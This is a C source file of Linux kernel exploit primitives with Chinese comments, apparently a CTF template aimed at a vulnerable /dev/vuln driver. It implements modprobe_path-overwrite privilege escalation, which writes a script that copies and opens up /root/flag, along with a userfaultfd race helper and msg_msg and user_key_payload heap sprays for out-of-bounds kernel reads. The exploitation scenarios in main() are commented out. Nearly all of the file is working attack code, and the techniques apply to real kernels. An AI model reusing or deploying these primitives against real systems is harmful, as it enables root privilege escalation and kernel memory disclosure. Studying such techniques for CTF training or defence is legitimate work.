#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h> 
#include <sys/types.h>
#include <unistd.h>


/* Global variables
 * 定义使用到的全局变量
 * 使用 gXXX 统一命名，避免与局部变量命名冲突
 */
int gfd1, gfd2, gfd3, gfd4;
void *gaddr1, *gaddr2, *gaddr3, *gaddr4;
uint64_t glen1, glen2, glen3, glen4;


/* Structures
 * 定义辅助结构体
 */
struct list_head {
	struct list_head *next, *prev;
};


/* Macros
 * 定义辅助宏
 */
#define assert(cond) \
{ \
    if(!(cond)) \
    { \
        printf("Line:%d: '%s' assertion failed\n", \
               __LINE__, #cond); \
        perror(#cond); \
        fflush(stdout); \
        exit(EXIT_FAILURE); \
    } \
}
#define offsetof(TYPE, MEMBER) \
    ((size_t) &((TYPE*)0)->MEMBER)
#define __X32_SYSCALL_BIT   0x40000000
#define syscall_x32(nr, args...) \
    syscall((nr) + __X32_SYSCALL_BIT, ##args)
/* 在/usr/include/x86_64-linux-gnu/bits/syscall.h中
 * 查看x64下的系统调用信息
 */
#define syscall_x64(nr, args...) \
    syscall((nr), ##args)


/* modprobe_path提权
 * 条件:
 *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`
 * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f
 *
 *
 * 参考:
 * https://www.anquanke.com/post/id/232545#h3-6
 */
void modprobe_exp()
{
    printf("[modprobe_exp] set fake modprobe content\n");
    fflush(stdout);
    system("echo '#!/bin/sh' > /tmp/a");
    system("echo 'cp /root/flag /tmp/flag' >> /tmp/a");
    system("echo 'chmod 777 /tmp/flag' >> /tmp/a");


    printf("[modprobe_exp] set fake modprobe permission\n");
    fflush(stdout);
    system("chmod +x /tmp/a");


    printf("[modprobe_exp] set unknown file content\n");
    fflush(stdout);
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");


    printf("[modprobe_exp] set unknown file permission\n");
    fflush(stdout);
    system("chmod +x /tmp/dummy");


    printf("[modprobe_exp] run unknown file\n");
    fflush(stdout);
    system("/tmp/dummy");


    printf("[modprobe_exp] read the flag\n");
    fflush(stdout);
    system("cat /tmp/flag");
}

/* userfaultfd条件竞争
 * 条件:
 *      1. userfaultfd机制被启用
 *      2. userfaultfd保护机制被关闭，即
 * /proc/sys/vm/unprivileged_userfaultfd 被设置为1
 *
 *
 * 参数:
 *      1. userfaultfd_exp():@addr是通过
 * mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE
        | MAP_ANONYMOUS, -1, 0) 申请的，此时内核仅仅分配了页表，
 * 并未分配物理页进行映射
 *      2. userfaultfd_exp():@len为通过mmap申请@addr时，传入的@len值
 *      3. userfaultfd_exp():@thread为自定义的进程 handler，其用于与内核进行交互，
 * 从而触发page fault
 *      3. userfaultfd_exp():@handler为自定义的userfaultfd handler，
 * 其会在内核进程触发page fault时，在userfaultfd_handler中被调用。
 * 其接受@page为参数，@page页内容在调用完@handler后，被用于初始化分配给内核进程的页
 *
 *
 * 返回值:
 *      1. userfaultfd_exp():@ret返回@thread创建的pthread_t，用于进程同步. 
 * 在直白一些，通过调用pthread_join(@ret)，确保@thread已经触发page fault，
 * 并且@handler已经被执行结束
 *
 *
 * 参考:
 * https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/
 */
struct uffd_arg {
    int uffd;                       /* 在userfaultfd_exp()中的uffd局部变量 */
    void *(*handler)(void *page);   /* 在userfaultfd_handler()中，执行的用户自定义
                                     * handler, 其中参数@page内容将在userfaultfd_handler()
                                     * 中，被用于初始化触发page fault的页 */
    int pg_size;                    /* 即页的大小 */
};
static void * userfaultfd_handler(void *arg)
{
    struct uffd_msg msg;
    char *page = NULL;
    struct uffdio_copy uffdio_copy;
    struct uffd_arg *uffd_arg = arg;

    printf("[userfaultfd_handler] create the page\n");
    if(page == NULL)
        assert((page = mmap(NULL, uffd_arg->pg_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0))
                != MAP_FAILED);

    for (;;) {

        struct pollfd pollfd;

        printf("[userfaultfd_handler] wait for event\n");
        pollfd.fd = uffd_arg->uffd;
        pollfd.events = POLLIN;
        assert(poll(&pollfd, 1, -1) != -1);

        printf("[userfaultfd_handler] read the event\n");
        assert(read(uffd_arg->uffd, &msg, sizeof(msg)) != 0);
        assert(msg.event == UFFD_EVENT_PAGEFAULT);

        printf("[userfaultfd_handler] execute user-defined handler\n");
        (*uffd_arg->handler)(page);

        printf("[userfaultfd_handler] handle page fault\n");
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                          ~(uffd_arg->pg_size - 1);
        uffdio_copy.len = uffd_arg->pg_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        assert(ioctl(uffd_arg->uffd, UFFDIO_COPY, &uffdio_copy) != -1);
    }

    return NULL;
}
pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
                     void *(*handler)(void *page))
{
    int uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    struct uffd_arg* uffd_arg;
    const int PG_SIZE = sysconf(_SC_PAGE_SIZE);
    pthread_t thr;


    printf("[userfaultfd_exp] create userfaultfd object\n");
    assert((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) != -1);


    printf("[userfaultfd_exp] set the userfaultfd api\n");
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);

    printf("[userfaultfd_exp] register the memory range\n");
    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = (len + PG_SIZE - 1) / PG_SIZE * PG_SIZE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);

    printf("[userfaultfd_exp] create the thread to handle userfaultfd events\n");
    assert((uffd_arg = malloc(sizeof(*uffd_arg))) != NULL);
    uffd_arg->uffd = uffd;
    uffd_arg->handler = handler;
    uffd_arg->pg_size = PG_SIZE;
    assert(pthread_create(&thr, NULL, userfaultfd_handler, uffd_arg) != -1);

    printf("[userfaultfd_exp] create the thread to trigger the page fault\n");
    assert(pthread_create(&thr, NULL, thread, NULL) != -1);

    return thr;
}

/* struct msg_msg读
 * 结构体:
 *          struct msg_msg {
 *              struct list_head m_list;
 *              long m_type;
 *              size_t m_ts;    // message text大小
 *              struct msg_msgseg *next;
 *              void *security; // 由于未开启SELinux，该字段恒为0
 *              // 用户定义数据从这里开始
 *          };
 *
 * 条件:
 *      1. 驱动中存在UAF，块大小为[0x30, 0x2000]，可以更改内存的[0x18, 0x28)处的值
 *      2. 如果更改了内存的[0x0, 0x10)的值，则需要调用recv_msg()，其需要内核
 * 开启CONFIG_CHECKPOINT_RESTORE设置；否则调用recv_msg_nocopy()即可
 *      3. recv_msg()读取信息时，需要和struct msg_msg的m_ts相同大小，否则会
 * 返回异常
 *
 * 参数:
 *      1. send_msg():@size，指内核态申请的内存大小，其会包含0x30的
 * struct msg_msg头
 *      2. send_msg():@content, 即用户定义的消息内容，其会被复制到
 * 内核态申请的内存中，主要用来查找这部分内存，可以设置为标志性字符串，如
 * "hhaawwkk1"等
 *      3. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()
 * 返回值
 *      4. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype
 * 内容和struct msg_msg头和@size的数据
 *
 * 返回值:
 *      1. send_msg():@ret返回创建的消息队列id
 *      2. recv_msg*():@ret返回读取的缓冲数组
 *
 * 参考:
 * https://www.anquanke.com/post/id/252558
 * https://elixir.bootlin.com/linux/v6.1/source/ipc/msg.c#L848
 * https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090
 */
 struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;    // message text大小
    struct msg_msgseg *next;
    void *security; // 由于未开启SELinux，该字段恒为0
};
int send_msg(size_t size, const char *content) {

    int qid;
    struct _msgbuf {
        long mtype;
        char mtext[size - sizeof(struct msg_msg)];
    } msg;

    // 创建
    assert((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) != -1);

    msg.mtype = 1;
    strncpy(msg.mtext, content, size - sizeof(struct msg_msg));
    assert(msgsnd(qid, &msg, sizeof(msg.mtext), 0) != -1);

    printf("[send_msg] msgget = %d\n", qid);
    fflush(stdout);

    return qid;
}
void *recv_msg(int qid, size_t size) {

    void *memdump;

    assert((memdump = malloc(size)) != NULL);

    if(msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -1) {
        perror("msgrcv");
        return NULL;
    }

    return memdump;
}
void *recv_msg_nocopy(int qid, size_t size) {

    void *memdump;

    assert((memdump = malloc(size)) != NULL);

    if(msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_NOERROR) == -1) {
        perror("msgrcv");
        return NULL;
    }

    return memdump;
}



/* struct user_key_payload读
 * 结构体:
 *        struct user_key_payload {
 *        	struct rcu_head	rcu;		// RCU destructor
 *        	unsigned short	datalen;	// length of this data
 *        	char		        data[] __aligned(__alignof__(u64)); // actual data
 *        };
 * 
 * 条件：
 *      1. 驱动中存在UAF，块大小为[0x18, 0x10000]，可以更改内存的[0x10, 0x14)处的值
 * 
 * 参数:
 *      1. spray_addkey():@payload，即用户上传的key内容，被复制到data部分
 *      2. spray_addkey():@size，即内核要申请的data大小,h. 注意，spray_addkey()中，
 * 内核会申请两个大小相近的块，`kvmalloc(@size, GFP_KERNEL)`和
 * `kmalloc(sizeof(struct user_key_payload) + @size, GFP_KERNEL)`
 * 
 * 返回值：
 *      1. spray_addkey():@ret，即创建的key的唯一表示
 * 
 * 参考：
 * https://www.anquanke.com/post/id/228233#h3-10
 * https://github.com/Markakd/n1ctf2020_W2L/blob/main/leak.c
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/keyctl.c#L74
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/key.c#L816
 * https://elixir.bootlin.com/linux/v6.1/source/security/keys/user_defined.c#L59
 */
#define KEY_MAX_DESC_SIZE 4096
struct callback_head {
	struct callback_head *next;
	void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __attribute__ ((__aligned__(sizeof(__u64)))); /* actual data */
};
key_serial_t spray_addkey(const char *payload, uint32_t size)
{
  char *payload_buf;
  key_serial_t key;

  /* 减去struct user_key_payload头，确保内核申请的大小为
   * @size
   */
  assert(size >= sizeof(struct user_key_payload));
  size -= sizeof(struct user_key_payload);

  assert((payload_buf = malloc(size)) != NULL);
  strncpy(payload_buf, payload, size);

  assert((key = syscall_x64(SYS_add_key, "user", "kernel-pwn-key", payload_buf, size,
                        KEY_SPEC_PROCESS_KEYRING)) != -1);

  printf("[spray_addkey] add_key = %x\n", key);
  fflush(stdout);

  return key;
}
void *spray_readkey(key_serial_t key, uint32_t size)
{
  void *payload;

  assert((payload = malloc(size)) != NULL);

  assert(syscall_x64(SYS_keyctl, KEYCTL_READ, key, payload, size, 0) == size);

  return payload;
}

/* 本次exp的符号定义
 */
#define VULN_WRITE		0x1737
#define VULN_READ		0x1738
#define VULN_ALLOC		0x1739
#define VULN_FREE		0x173A

long long *modprobe_path = (long long*) 0xffffffff82651120;
long long fake_modprobe_path = 0x612f706d742f;

typedef struct {
	long long *addr;
	long long val;
} Data;

void *uf_handler(void *page)
{
    Data *data = (Data *)page;
    data->addr = modprobe_path;
    data->val = fake_modprobe_path;
    sleep(5);
    return NULL;
}

void *uf_thread(void *arg)
{
    assert(ioctl(gfd1, VULN_WRITE, gaddr1) == 0);
    return NULL;
}

int main(void)
{

    /* 尝试使用modprobe进行提权
     */
    //int fd;
    //Data data;

    //assert((fd = open("/dev/vuln", O_RDWR)) >= 0);

    //data.addr = modprobe_path;
    //data.val = fake_modprobe_path;

    //assert(ioctl(fd, VULN_WRITE, &data) == 0);
    //modprobe_exp();




    ///* 尝试使用userfaultfd扩大条件竞争
    // */
    //Data data;
    //long long buf;
    //uint64_t len;
    //pthread_t thread;

    //len = 0x1000;
    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 注册userfaultfd，并通过ur_thr触发page fault
    //assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,
    //                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))
    //       != MAP_FAILED);
    //thread = userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);

    //// 此时page fault还未处理完，条件竞争读取modprobe_path值
    //data.addr = modprobe_path;
    //data.val = (long long)&buf;
    //assert(ioctl(gfd1, VULN_READ, &data) == 0);
    //assert(buf != fake_modprobe_path);

    //// 等待uf_thr终止
    //assert(pthread_join(thread, NULL) == 0);
    //modprobe_exp();





    ///* 尝试利用struct msg_msg结构体
    // * 进行数据读取或写入
    // */
    //Data data;
    //char *kbuf1, *kbuf2;
    //int qid, size = 0x80;
    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 内核态申请0x80大小的内存
    //data.val = size;
    //assert(ioctl(gfd1, VULN_ALLOC, &data) == 0)
    //kbuf1 = (char *)data.addr;

    //// 制造UAF
    //assert(ioctl(gfd1, VULN_FREE, &data) == 0)

    //// 开始heap spray
    //qid = send_msg_str(size, "hhaawwkk1");

    //// 利用UAF修改struct msg_msg的m_ts字段
    //data.addr = (long long*)(kbuf1 + offsetof(struct msg_msg, m_ts));
    //data.val = 0x1000;
    //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);

    //assert((kbuf2 = recv_msg_nocopy(qid, 0x1000)) != NULL);
    //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x13]);





    ///* 尝试利用struct user_key_payload结构体
    // * 进行数据读取或写入
    // */
    //Data data;
    //char *kbuf1, *kbuf2;
    //int size = 0x70;
    //key_serial_t key;

    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);

    //// 内核态申请0x80大小的内存
    //data.val = size;
    //assert(ioctl(gfd1, VULN_ALLOC, &data) == 0)
    //kbuf1 = (char *)data.addr;

    //// 制造UAF
    //assert(ioctl(gfd1, VULN_FREE, &data) == 0)

    //// 开始heap spray
    //key = spray_addkey("hhaawwkk1", size);

    //// 利用UAF修改struct user_key_payload的datalen字段
    //data.addr = (long long*)(kbuf1 + offsetof(struct user_key_payload, datalen));
    //data.val = 0x1000;
    //assert(ioctl(gfd1, VULN_WRITE, &data) == 0);

    //kbuf2 = spray_readkey(key, 0x1000);
    //assert(((long long)kbuf1 + 0x100) == ((long long*)kbuf2)[0x15]);
    return 0;
}